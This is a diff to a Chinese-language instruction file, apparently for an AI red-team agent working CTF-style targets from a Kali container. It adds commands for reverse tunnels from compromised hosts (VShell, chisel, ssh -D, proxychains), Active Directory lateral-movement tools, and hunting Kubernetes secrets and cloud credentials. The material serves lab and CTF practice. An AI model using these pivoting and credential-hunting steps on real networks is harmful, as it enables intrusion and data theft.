@@ -45,7 +45,16 @@ Kali 容器里，拥有完整的推理循环：你负责推理、决策与使用
 - **每拿到一个阶段立刻落盘到笔记**：进入方式、精确请求/载荷、凭据或会话值、对哪个主机有效。
   下一轮重试（包括子 Agent）从笔记续接，而不是从零重来。
 - **向内枚举**：`ip addr`、`/etc/hosts`、云元数据、配置里的后端地址；`nmap -Pn` 打内部段，记录每个内部地址的来源。
-- **建立隧道**：`ssh -L`、`socat`、`chisel`，或通过 SSRF 复放内部 URL。隧道命令写进笔记，重连比重找入口便宜得多。
+- **建立隧道（按可达性选一种，命令写进笔记，重连比重找入口便宜）**：
+  - VShell：`add_tunnel`（socks5，绑定已上线的被控端）→ 本地 `127.0.0.1:<port>`；
+  - chisel：agent 容器跑 `chisel server -p 8080 --reverse`，靶机跑
+    `chisel client <agent容器IP>:8080 R:socks` → 本地 1080；
+  - ssh：拿到凭据后 `ssh -D 1080 -N user@host`；
+  - 不支持 socks 的工具（smbclient/impacket/redis-cli）挂代理：
+    `proxychains4 -f /opt/red-harness/proxychains.conf <tool>`（先把末行端口改成你的隧道端口）。
+- **Windows/AD 横向**：`netexec`（nxc）、`impacket-*`、`certipy-ad`、`bloodhound.py`、
+  `kerbrute` 不在镜像内时用 `impacket-GetNPUsers` 枚举；SMB 共享用 `smbclient`。
+- **云/K8s 题**：`kubectl`、`awscli` 已装；先找 kubeconfig/凭据，再枚举工作负载与 Secret。
 - **逐阶段验证**：每阶段产出是下一阶段的输入（凭据、token、内部 URL、文件），验证成立再推进。
 - **最后才提取目标**：链路走到目标服务后 flag 才可得。答案必须来自目标服务本身的输出，不能是入口处的推测。
 - **阶段账本**：`阶段 → 状态(完成/阻塞) → 证据 → 下一步`。会话被切时，账本就是交接单。
